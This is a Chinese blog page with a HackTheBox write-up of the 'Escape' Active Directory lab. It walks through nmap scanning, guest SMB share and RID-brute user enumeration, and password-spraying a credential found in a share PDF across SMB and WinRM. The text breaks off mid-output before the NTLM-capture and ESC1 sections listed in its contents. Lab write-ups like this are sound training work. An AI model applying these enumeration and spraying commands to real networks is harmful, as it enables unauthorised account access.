<!DOCTYPE html>
<html lang=zh>
<head>
    <!-- Google Fonts -->
    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/cn-fontsource-lxgw-wen-kai-screen-r/font.css">
    <link rel="stylesheet" type="text/css" href="https://fonts.font.im/css?family=Inconsolata:normal,bold">
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="Welcome to N0nome&#96;s F**king blog.(:This is just a joke:)Do you want to become stronger than me? You just need to move your hands more. 鉴于博主学识浅薄，文中只写通关，其中利害关系还需要各位Google学习 nmap123456789101112131415">
<meta property="og:type" content="article">
<meta property="og:title" content="HackTheBox——Tracks AD Escape">
<meta property="og:url" content="https://n0nome.github.io/2025/06/19/Escape/HackTheBox%E2%80%94%E2%80%94Tracks%20AD%20Escape/index.html">
<meta property="og:site_name" content="N0nome&#96;s Fucking Life">
<meta property="og:description" content="Welcome to N0nome&#96;s F**king blog.(:This is just a joke:)Do you want to become stronger than me? You just need to move your hands more. 鉴于博主学识浅薄，文中只写通关，其中利害关系还需要各位Google学习 nmap123456789101112131415">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://n0nome.github.io/images/escape.png">
<meta property="og:image" content="https://n0nome.github.io/images/escape-1.png">
<meta property="og:image" content="https://n0nome.github.io/images/escape-2.png">
<meta property="og:image" content="https://n0nome.github.io/images/escape-3.png">
<meta property="article:published_time" content="2025-06-19T13:59:05.047Z">
<meta property="article:modified_time" content="2025-06-19T13:59:05.047Z">
<meta property="article:author" content="n0nome">
<meta property="article:tag" content="writeup">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://n0nome.github.io/images/escape.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/laojun.jpg">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/laojun.jpg" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/laojun.jpg">
        
      
    
    <!-- title -->
    <title>HackTheBox——Tracks AD Escape</title>
    <!-- async scripts -->
    <!-- Google Analytics -->

  <script async src="https://www.googletagmanager.com/gtag/js?id=G-RXS95XH60B"></script>
  <script>
      window.dataLayer = window.dataLayer || [];
      function gtag(){dataLayer.push(arguments);}
      gtag('js', new Date());
      gtag('config', 'G-RXS95XH60B');
  </script>


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
    
      <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@4.0/dist/fancybox.css" />
    
<meta name="generator" content="Hexo 7.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">首页</a></li><!--
     --><!--
       --><li><a href="/about/">关于</a></li><!--
     --><!--
       --><li><a href="https://n0nome.github.io/tags/writeup/">writeup</a></li><!--
     --><!--
       --><li><a href="https://n0nome.github.io/tags/random/">random</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="上一篇" href="/2025/06/19/Eureka/Eureka/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="下一篇" href="/2025/06/19/Environment/HackTheBox%E2%80%94%E2%80%94HTB%20Environment%20Writeup/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">上一篇</span>
      <span id="i-next" class="info" style="display:none;">下一篇</span>
      <span id="i-top" class="info" style="display:none;">返回顶部</span>
      <span id="i-share" class="info" style="display:none;">分享文章</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://n0nome.github.io/2025/06/19/Escape/HackTheBox%E2%80%94%E2%80%94Tracks%20AD%20Escape/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://n0nome.github.io/2025/06/19/Escape/HackTheBox%E2%80%94%E2%80%94Tracks%20AD%20Escape/&text=HackTheBox——Tracks AD Escape"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://n0nome.github.io/2025/06/19/Escape/HackTheBox%E2%80%94%E2%80%94Tracks%20AD%20Escape/&title=HackTheBox——Tracks AD Escape"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://n0nome.github.io/2025/06/19/Escape/HackTheBox%E2%80%94%E2%80%94Tracks%20AD%20Escape/&is_video=false&description=HackTheBox——Tracks AD Escape"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=HackTheBox——Tracks AD Escape&body=Check out this article: https://n0nome.github.io/2025/06/19/Escape/HackTheBox%E2%80%94%E2%80%94Tracks%20AD%20Escape/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://n0nome.github.io/2025/06/19/Escape/HackTheBox%E2%80%94%E2%80%94Tracks%20AD%20Escape/&title=HackTheBox——Tracks AD Escape"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://n0nome.github.io/2025/06/19/Escape/HackTheBox%E2%80%94%E2%80%94Tracks%20AD%20Escape/&title=HackTheBox——Tracks AD Escape"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://n0nome.github.io/2025/06/19/Escape/HackTheBox%E2%80%94%E2%80%94Tracks%20AD%20Escape/&title=HackTheBox——Tracks AD Escape"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://n0nome.github.io/2025/06/19/Escape/HackTheBox%E2%80%94%E2%80%94Tracks%20AD%20Escape/&title=HackTheBox——Tracks AD Escape"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://n0nome.github.io/2025/06/19/Escape/HackTheBox%E2%80%94%E2%80%94Tracks%20AD%20Escape/&name=HackTheBox——Tracks AD Escape&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://n0nome.github.io/2025/06/19/Escape/HackTheBox%E2%80%94%E2%80%94Tracks%20AD%20Escape/&t=HackTheBox——Tracks AD Escape"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>

    

    
      <!-- 如果文章被加密，初始隐藏目录 -->
      <div id="toc" style="">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#nmap"><span class="toc-number">1.</span> <span class="toc-text">nmap</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#smb-enum"><span class="toc-number">1.1.</span> <span class="toc-text">smb enum</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ntlm-hash-hijack"><span class="toc-number">1.2.</span> <span class="toc-text">ntlm hash hijack</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#shell-as-sql-svc"><span class="toc-number">2.</span> <span class="toc-text">shell as sql_svc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#get-pass-at-bak"><span class="toc-number">2.1.</span> <span class="toc-text">get pass at .bak</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#shell-as-Ryan-Cooper"><span class="toc-number">3.</span> <span class="toc-text">shell as Ryan.Cooper</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ESC1-classic-abuse"><span class="toc-number">3.1.</span> <span class="toc-text">ESC1 classic abuse</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Hashes"><span class="toc-number">4.</span> <span class="toc-text">Hashes</span></a></li></ol>
      </div>
     
 </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        HackTheBox——Tracks AD Escape
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">n0nome</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2025-06-19T13:59:05.047Z" class="dt-published" itemprop="datePublished">2025-06-19</time>
        
        (Updated: <time datetime="2025-06-19T13:59:05.047Z" class="dt-updated" itemprop="dateModified">2025-06-19</time>)
        
      
    </div>


      

      
    <div class="article-tag">
        <i class="fa-solid fa-tag"></i>
        <a class="p-category" href="/tags/writeup/" rel="tag">writeup</a>
    </div>


    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <p>Welcome to N0nome&#96;s F**king <a href="https://n0nome.github.io/">blog</a>.<br>(:This is just a joke:)<br><a target="_blank" rel="noopener" href="https://referral.hackthebox.com/mz8uK3T">Do you want to become stronger than me? You just need to move your hands more.</a></p>
<p><code>鉴于博主学识浅薄，文中只写通关，其中利害关系还需要各位Google学习</code><br><a data-fancybox="gallery" data-src="/images/escape.png" data-caption=""><img src="/images/escape.png"></a></p>
<h2 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">PORT      STATE SERVICE       VERSION</span><br><span class="line">53/tcp    open  domain        Simple DNS Plus</span><br><span class="line">88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server <span class="keyword">time</span>: 2025-04-30 15:00:23Z)</span><br><span class="line">135/tcp   open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn      </span><br><span class="line">389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)</span><br><span class="line">| ssl-cert: Subject:                                                                             </span><br><span class="line">| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel</span><br><span class="line">| Not valid before: 2024-01-18T23:03:57                                                                                                                                                            </span><br><span class="line">|_Not valid after:  2074-01-05T23:03:57</span><br><span class="line">|_ssl-<span class="built_in">date</span>: 2025-04-30T15:01:59+00:00; +7h59m59s from scanner <span class="keyword">time</span>.</span><br><span class="line">445/tcp   open  microsoft-ds?                                                                    </span><br><span class="line">464/tcp   open  kpasswd5?                                                                        </span><br><span class="line">593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)</span><br><span class="line">| ssl-cert: Subject: </span><br><span class="line">| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel</span><br><span class="line">| Not valid before: 2024-01-18T23:03:57</span><br><span class="line">|_Not valid after:  2074-01-05T23:03:57</span><br><span class="line">|_ssl-<span class="built_in">date</span>: 2025-04-30T15:01:59+00:00; +8h00m00s from scanner <span class="keyword">time</span>.</span><br><span class="line">1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM</span><br><span class="line">|_ms-sql-info: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback     </span><br><span class="line">| Not valid before: 2025-04-30T14:54:57</span><br><span class="line">|_Not valid after:  2055-04-30T14:54:57                                                                                                                                                            </span><br><span class="line">|_ssl-<span class="built_in">date</span>: 2025-04-30T15:01:59+00:00; +7h59m59s from scanner <span class="keyword">time</span>.</span><br><span class="line">3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)                                                                        </span><br><span class="line">| ssl-cert: Subject:                                                                                                                                                                               </span><br><span class="line">| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel</span><br><span class="line">| Not valid before: 2024-01-18T23:03:57</span><br><span class="line">|_Not valid after:  2074-01-05T23:03:57</span><br><span class="line">|_ssl-<span class="built_in">date</span>: 2025-04-30T15:01:59+00:00; +7h59m59s from scanner <span class="keyword">time</span>.</span><br><span class="line">3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)</span><br><span class="line">| ssl-cert: Subject: </span><br><span class="line">| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel</span><br><span class="line">| Not valid before: 2024-01-18T23:03:57</span><br><span class="line">|_Not valid after:  2074-01-05T23:03:57</span><br><span class="line">|_ssl-<span class="built_in">date</span>: 2025-04-30T15:01:59+00:00; +8h00m00s from scanner <span class="keyword">time</span>.</span><br><span class="line">5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">9389/tcp  open  mc-nmf        .NET Message Framing</span><br><span class="line">49667/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49689/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">49690/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49711/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49721/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Device <span class="built_in">type</span>: general purpose</span><br><span class="line">Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)</span><br><span class="line">OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10</span><br><span class="line">Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)</span><br><span class="line">No exact OS matches <span class="keyword">for</span> host (<span class="built_in">test</span> conditions non-ideal).</span><br><span class="line">Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   3:1:1: </span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line">| smb2-time: </span><br><span class="line">|   <span class="built_in">date</span>: 2025-04-30T15:01:23</span><br><span class="line">|_  start_date: N/A</span><br><span class="line">|_clock-skew: mean: 7h59m59s, deviation: 0s, median: 7h59m58s</span><br></pre></td></tr></table></figure>
<p>先加hosts</p>
<h3 id="smb-enum"><a href="#smb-enum" class="headerlink" title="smb enum"></a>smb enum</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$ nxc smb sequel.htb -u anonymous -p <span class="string">&#x27;&#x27;</span></span><br><span class="line">SMB         10.129.228.253  445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False) </span><br><span class="line">SMB         10.129.228.253  445    DC               [+] sequel.htb\anonymous: (Guest)</span><br><span class="line"></span><br><span class="line">$ nxc smb sequel.htb -u guest -p <span class="string">&#x27;&#x27;</span> --shares</span><br><span class="line">SMB         10.129.228.253  445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False) </span><br><span class="line">SMB         10.129.228.253  445    DC               [+] sequel.htb\guest: </span><br><span class="line">SMB         10.129.228.253  445    DC               [*] Enumerated shares</span><br><span class="line">SMB         10.129.228.253  445    DC               Share           Permissions     Remark</span><br><span class="line">SMB         10.129.228.253  445    DC               -----           -----------     ------</span><br><span class="line">SMB         10.129.228.253  445    DC               ADMIN$                          Remote Admin</span><br><span class="line">SMB         10.129.228.253  445    DC               C$                              Default share</span><br><span class="line">SMB         10.129.228.253  445    DC               IPC$            READ            Remote IPC</span><br><span class="line">SMB         10.129.228.253  445    DC               NETLOGON                        Logon server share </span><br><span class="line">SMB         10.129.228.253  445    DC               Public          READ            </span><br><span class="line">SMB         10.129.228.253  445    DC               SYSVOL                          Logon server share </span><br></pre></td></tr></table></figure>
<p>可以看到smb有一个<code>Public</code>和<code>IPC$</code>可读，不要急，一个一个来</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$ smbclient \\\\sequel.htb\\Public -U guest</span><br><span class="line">Can<span class="string">&#x27;t load /etc/samba/smb.conf - run testparm to debug it</span></span><br><span class="line"><span class="string">Password for [WORKGROUP\guest]:</span></span><br><span class="line"><span class="string">Try &quot;help&quot; to get a list of possible commands.</span></span><br><span class="line"><span class="string">smb: \&gt; ls</span></span><br><span class="line"><span class="string">  .                                   D        0  Sat Nov 19 19:51:25 2022</span></span><br><span class="line"><span class="string">  ..                                  D        0  Sat Nov 19 19:51:25 2022</span></span><br><span class="line"><span class="string">  SQL Server Procedures.pdf           A    49551  Fri Nov 18 21:39:43 2022</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                5184255 blocks of size 4096. 1440326 blocks available</span></span><br><span class="line"><span class="string">smb: \&gt; prompt</span></span><br><span class="line"><span class="string">smb: \&gt; mget *</span></span><br><span class="line"><span class="string">getting file \SQL Server Procedures.pdf of size 49551 as SQL Server Procedures.pdf (70.3 KiloBytes/sec) (average 70.3 KiloBytes/sec)</span></span><br></pre></td></tr></table></figure>
<p>两个可读只有一个pdf，那顺便在枚举一下user吧</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">$ nxc smb sequel.htb -u guest -p <span class="string">&#x27;&#x27;</span> --rid-brute</span><br><span class="line">SMB         10.129.228.253  445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False) </span><br><span class="line">SMB         10.129.228.253  445    DC               [+] sequel.htb\guest: </span><br><span class="line">SMB         10.129.228.253  445    DC               498: sequel\Enterprise Read-only Domain Controllers (SidTypeGroup)</span><br><span class="line">SMB         10.129.228.253  445    DC               500: sequel\Administrator (SidTypeUser)</span><br><span class="line">SMB         10.129.228.253  445    DC               501: sequel\Guest (SidTypeUser)</span><br><span class="line">SMB         10.129.228.253  445    DC               502: sequel\krbtgt (SidTypeUser)</span><br><span class="line">SMB         10.129.228.253  445    DC               512: sequel\Domain Admins (SidTypeGroup)</span><br><span class="line">SMB         10.129.228.253  445    DC               513: sequel\Domain Users (SidTypeGroup)</span><br><span class="line">SMB         10.129.228.253  445    DC               514: sequel\Domain Guests (SidTypeGroup)</span><br><span class="line">SMB         10.129.228.253  445    DC               515: sequel\Domain Computers (SidTypeGroup)</span><br><span class="line">SMB         10.129.228.253  445    DC               516: sequel\Domain Controllers (SidTypeGroup)</span><br><span class="line">SMB         10.129.228.253  445    DC               517: sequel\Cert Publishers (SidTypeAlias)</span><br><span class="line">SMB         10.129.228.253  445    DC               518: sequel\Schema Admins (SidTypeGroup)</span><br><span class="line">SMB         10.129.228.253  445    DC               519: sequel\Enterprise Admins (SidTypeGroup)</span><br><span class="line">SMB         10.129.228.253  445    DC               520: sequel\Group Policy Creator Owners (SidTypeGroup)</span><br><span class="line">SMB         10.129.228.253  445    DC               521: sequel\Read-only Domain Controllers (SidTypeGroup)</span><br><span class="line">SMB         10.129.228.253  445    DC               522: sequel\Cloneable Domain Controllers (SidTypeGroup)</span><br><span class="line">SMB         10.129.228.253  445    DC               525: sequel\Protected Users (SidTypeGroup)</span><br><span class="line">SMB         10.129.228.253  445    DC               526: sequel\Key Admins (SidTypeGroup)</span><br><span class="line">SMB         10.129.228.253  445    DC               527: sequel\Enterprise Key Admins (SidTypeGroup)</span><br><span class="line">SMB         10.129.228.253  445    DC               553: sequel\RAS and IAS Servers (SidTypeAlias)</span><br><span class="line">SMB         10.129.228.253  445    DC               571: sequel\Allowed RODC Password Replication Group (SidTypeAlias)</span><br><span class="line">SMB         10.129.228.253  445    DC               572: sequel\Denied RODC Password Replication Group (SidTypeAlias)</span><br><span class="line">SMB         10.129.228.253  445    DC               1000: sequel\DC$ (SidTypeUser)</span><br><span class="line">SMB         10.129.228.253  445    DC               1101: sequel\DnsAdmins (SidTypeAlias)</span><br><span class="line">SMB         10.129.228.253  445    DC               1102: sequel\DnsUpdateProxy (SidTypeGroup)</span><br><span class="line">SMB         10.129.228.253  445    DC               1103: sequel\Tom.Henn (SidTypeUser)</span><br><span class="line">SMB         10.129.228.253  445    DC               1104: sequel\Brandon.Brown (SidTypeUser)</span><br><span class="line">SMB         10.129.228.253  445    DC               1105: sequel\Ryan.Cooper (SidTypeUser)</span><br><span class="line">SMB         10.129.228.253  445    DC               1106: sequel\sql_svc (SidTypeUser)</span><br><span class="line">SMB         10.129.228.253  445    DC               1107: sequel\James.Roberts (SidTypeUser)</span><br><span class="line">SMB         10.129.228.253  445    DC               1108: sequel\Nicole.Thompson (SidTypeUser)</span><br><span class="line">SMB         10.129.228.253  445    DC               1109: sequel\SQLServer2005SQLBrowserUser<span class="variable">$DC</span> (SidTypeAlias)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 可以整理一下</span></span><br><span class="line">$ nxc smb sequel.htb -u guest -p <span class="string">&#x27;&#x27;</span> --rid-brute | grep SidTypeUser | awk -F <span class="string">&#x27;\&#x27;</span> <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | awk -F <span class="string">&#x27; &#x27;</span> <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | <span class="built_in">tee</span> user</span><br><span class="line">Administrator</span><br><span class="line">Guest</span><br><span class="line">krbtgt</span><br><span class="line">DC$</span><br><span class="line">Tom.Henn</span><br><span class="line">Brandon.Brown</span><br><span class="line">Ryan.Cooper</span><br><span class="line">sql_svc</span><br><span class="line">James.Roberts</span><br><span class="line">Nicole.Thompson</span><br></pre></td></tr></table></figure>
<p>看一下pdf是什么内容<br><a data-fancybox="gallery" data-src="/images/escape-1.png" data-caption=""><img src="/images/escape-1.png"></a><br>这给了一个<strong>PublicUser:GuestUserCantWrite1</strong>，让我们去登mssql，我偏不</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">$ nxc smb sequel.htb -u user -p <span class="string">&quot;GuestUserCantWrite1&quot;</span> --continue-on-success</span><br><span class="line">SMB         10.129.228.253  445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False) </span><br><span class="line">SMB         10.129.228.253  445    DC               [-] sequel.htb\Administrator:GuestUserCantWrite1 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.129.228.253  445    DC               [-] sequel.htb\Guest:GuestUserCantWrite1 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.129.228.253  445    DC               [-] sequel.htb\krbtgt:GuestUserCantWrite1 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.129.228.253  445    DC               [-] sequel.htb\DC$:GuestUserCantWrite1 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.129.228.253  445    DC               [-] sequel.htb\Tom.Henn:GuestUserCantWrite1 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.129.228.253  445    DC               [-] sequel.htb\Brandon.Brown:GuestUserCantWrite1 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.129.228.253  445    DC               [-] sequel.htb\Ryan.Cooper:GuestUserCantWrite1 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.129.228.253  445    DC               [-] sequel.htb\sql_svc:GuestUserCantWrite1 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.129.228.253  445    DC               [-] sequel.htb\James.Roberts:GuestUserCantWrite1 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.129.228.253  445    DC               [-] sequel.htb\Nicole.Thompson:GuestUserCantWrite1 STATUS_LOGON_FAILURE </span><br><span class="line"></span><br><span class="line">$ nxc winrm sequel.htb -u user -p <span class="string">&quot;GuestUserCantWrite1&quot;</span> --continue-on-success                     </span><br><span class="line">WINRM       10.129.228.253  5985   DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:sequel.htb)                                                                         </span><br><span class="line">WINRM       10.129.228.253  5985   DC               [-] sequel.htb\Administrator:GuestUserCantWrite1                                   </span><br><span class="line">WINRM       10.129.228.253  5985   DC               [-] sequel.htb\Guest:GuestUserCantWrite1     </span><br><span class="line">WINRM       10.129.228.253  5985   DC               [-] 